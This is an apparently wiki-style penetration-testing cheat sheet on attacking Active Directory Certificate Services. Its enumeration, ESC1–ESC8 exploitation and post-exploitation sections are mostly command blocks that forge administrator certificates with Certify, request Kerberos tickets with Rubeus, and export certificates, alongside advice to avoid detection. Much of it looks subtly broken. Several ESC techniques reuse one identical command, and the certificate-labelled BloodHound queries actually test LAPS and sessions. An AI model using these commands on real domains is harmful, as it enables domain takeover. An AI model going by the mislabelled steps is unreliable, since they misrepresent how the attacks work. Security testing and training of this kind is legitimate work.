# Active Directory Certificate Services (ADCS)

### Overview

Active Directory Certificate Services (ADCS) is a Windows Server role that provides public key infrastructure (PKI) functionality. This guide covers techniques for testing ADCS security.

### Enumeration

#### 1. Service Discovery

```powershell
# Using PowerView
Get-ADObject -LDAPFilter "(objectClass=pKIEnrollmentService)" -Properties *
Get-ADObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties *

# Using Certify
Certify.exe find
Certify.exe find /vulnerable
```

#### 2. Certificate Template Enumeration

```powershell
# Using PowerView
Get-ADObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties * | Select-Object Name, pkiPathLength, pkiPrivateKeyFlag, pkiEnrollmentFlag, pkiSubjectNameFlag

# Using Certify
Certify.exe find /template:*
```

### Authentication Testing

#### 1. Certificate Request

```powershell
# Using Certify
Certify.exe request /ca:<CA_SERVER>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:<ALT_NAME>

# Using Certreq
certreq -new request.inf cert.cer
certreq -submit cert.cer cert.crt
```

#### 2. Certificate Enrollment

```powershell
# Using Certify
Certify.exe enroll /ca:<CA_SERVER>\<CA_NAME> /template:<TEMPLATE_NAME>

# Using Certreq
certreq -accept cert.crt
```

### Configuration Testing

#### 1. CA Configuration

```powershell
# Using Certify
Certify.exe ca /ca:<CA_SERVER>\<CA_NAME>

# Using Certutil
certutil -dump
certutil -getreg
```

#### 2. Template Configuration

```powershell
# Using PowerView
Get-ADObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties * | Select-Object Name, pkiPathLength, pkiPrivateKeyFlag, pkiEnrollmentFlag, pkiSubjectNameFlag

# Using Certify
Certify.exe find /template:*
```

### Exploitation

#### 1. ESC1 - Misconfigured Certificate Templates

```powershell
# Using Certify
Certify.exe request /ca:<CA_SERVER>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:administrator@domain.com

# Using Rubeus
Rubeus.exe asktgt /user:administrator /certificate:<CERTIFICATE> /ptt
```

#### 2. ESC2 - Any Purpose EKU

```powershell
# Using Certify
Certify.exe request /ca:<CA_SERVER>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:administrator@domain.com

# Using Rubeus
Rubeus.exe asktgt /user:administrator /certificate:<CERTIFICATE> /ptt
```

#### 3. ESC3 - Enrollment Agent

```powershell
# Using Certify
Certify.exe request /ca:<CA_SERVER>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:administrator@domain.com

# Using Rubeus
Rubeus.exe asktgt /user:administrator /certificate:<CERTIFICATE> /ptt
```

#### 4. ESC4 - Access Control

```powershell
# Using PowerView
Get-ADObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties * | Select-Object Name, nTSecurityDescriptor

# Using Certify
Certify.exe request /ca:<CA_SERVER>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:administrator@domain.com
```

#### 5. ESC5 - Vulnerable PKI Object Access Control

```powershell
# Using PowerView
Get-ADObject -LDAPFilter "(objectClass=pKIEnrollmentService)" -Properties * | Select-Object Name, nTSecurityDescriptor

# Using Certify
Certify.exe request /ca:<CA_SERVER>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:administrator@domain.com
```

#### 6. ESC6 - EDITF\_ATTRIBUTESUBJECTALTNAME2

```powershell
# Using Certify
Certify.exe request /ca:<CA_SERVER>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:administrator@domain.com

# Using Rubeus
Rubeus.exe asktgt /user:administrator /certificate:<CERTIFICATE> /ptt
```

#### 7. ESC7 - Vulnerable Certificate Authority Access Control

```powershell
# Using PowerView
Get-ADObject -LDAPFilter "(objectClass=pKIEnrollmentService)" -Properties * | Select-Object Name, nTSecurityDescriptor

# Using Certify
Certify.exe request /ca:<CA_SERVER>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:administrator@domain.com
```

#### 8. ESC8 - NTLM Relay to AD CS HTTP Endpoints

```powershell
# Using Certify
Certify.exe request /ca:<CA_SERVER>\<CA_NAME> /template:<TEMPLATE_NAME> /altname:administrator@domain.com

# Using Rubeus
Rubeus.exe asktgt /user:administrator /certificate:<CERTIFICATE> /ptt
```

### Post-Exploitation

#### 1. Certificate Theft

```powershell
# Using Certify
Certify.exe export /ca:<CA_SERVER>\<CA_NAME> /id:<CERTIFICATE_ID>

# Using Certutil
certutil -exportPFX -p <PASSWORD> <CERTIFICATE_ID> cert.pfx
```

#### 2. Certificate Abuse

```powershell
# Using Rubeus
Rubeus.exe asktgt /user:administrator /certificate:<CERTIFICATE> /ptt
Rubeus.exe s4u /user:administrator /certificate:<CERTIFICATE> /impersonateuser:krbtgt /ptt
```

### BloodHound AD Integration

#### 1. Data Collection

```powershell
# Using SharpHound
Invoke-BloodHound -CollectionMethod All
Invoke-BloodHound -CollectionMethod CertServices

# Using BloodHound Python
bloodhound-python -d domain.local -u user -p password -c All
bloodhound-python -d domain.local -u user -p password -c CertServices
```

#### 2. ADCS Analysis

```powershell
# Using BloodHound
MATCH (n:Computer) WHERE n.haslaps=true RETURN n
MATCH (n:Computer) WHERE n.operatingsystem CONTAINS 'Server' RETURN n
MATCH (n:Computer) WHERE n.enabled=true RETURN n

# Certificate Template Analysis
MATCH (n:Computer)-[:HasSession]->(m:User) WHERE n.haslaps=true RETURN n,m
MATCH (n:User)-[:GenericAll]->(m:Computer) WHERE m.haslaps=true RETURN n,m
```

#### 3. Attack Path Analysis

```powershell
# Using BloodHound
MATCH p=shortestPath((n:User)-[*1..]->(m:Group)) WHERE n.name CONTAINS 'USER' AND m.name CONTAINS 'DOMAIN ADMINS' RETURN p
MATCH p=shortestPath((n:Computer)-[*1..]->(m:Group)) WHERE n.name CONTAINS 'SERVER' AND m.name CONTAINS 'DOMAIN ADMINS' RETURN p

# Certificate-based Paths
MATCH p=shortestPath((n:User)-[*1..]->(m:Computer)) WHERE n.name CONTAINS 'USER' AND m.haslaps=true RETURN p
MATCH p=shortestPath((n:Computer)-[*1..]->(m:Group)) WHERE n.haslaps=true AND m.name CONTAINS 'DOMAIN ADMINS' RETURN p
```

#### 4. Custom Queries

```powershell
# Find Computers with ADCS Role
MATCH (n:Computer) WHERE n.operatingsystem CONTAINS 'Server' AND n.haslaps=true RETURN n

# Find Users with Certificate Enrollment Rights
MATCH (n:User)-[:GenericAll]->(m:Computer) WHERE m.haslaps=true RETURN n,m

# Find Certificate Templates
MATCH (n:Computer)-[:HasSession]->(m:User) WHERE n.haslaps=true AND m.enabled=true RETURN n,m
```

### Tools

#### 1. Primary Tools

* Certify
* Rubeus
* PowerView
* Certutil
* Certreq
* BloodHound
* SharpHound
* BloodHound Python

#### 2. Additional Tools

* PSPKIAudit
* PKIAudit
* Certipy
* PKIHealth
* CertSrv
* Neo4j
* Cypher

### Best Practices

#### 1. Testing Strategy

* Start with non-intrusive techniques
* Use multiple methods
* Document findings
* Test safely
* Follow engagement scope

#### 2. OPSEC Considerations

* Use stealth techniques
* Avoid detection
* Monitor for alerts
* Use legitimate tools
* Follow engagement scope

### Resources

* [Certify](https://github.com/GhostPack/Certify)
* [Rubeus](https://github.com/GhostPack/Rubeus)
* [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
* [Certipy](https://github.com/ly4k/Certipy)
* [BloodHound](https://github.com/BloodHoundAD/BloodHound)
* [SharpHound](https://github.com/BloodHoundAD/BloodHound/tree/master/Collectors)
* [BloodHound Python](https://github.com/fox-it/BloodHound.py)
* [MITRE ATT\&CK](https://attack.mitre.org/techniques/T1558/004/)

***

_Last Updated: 2025-03-23_
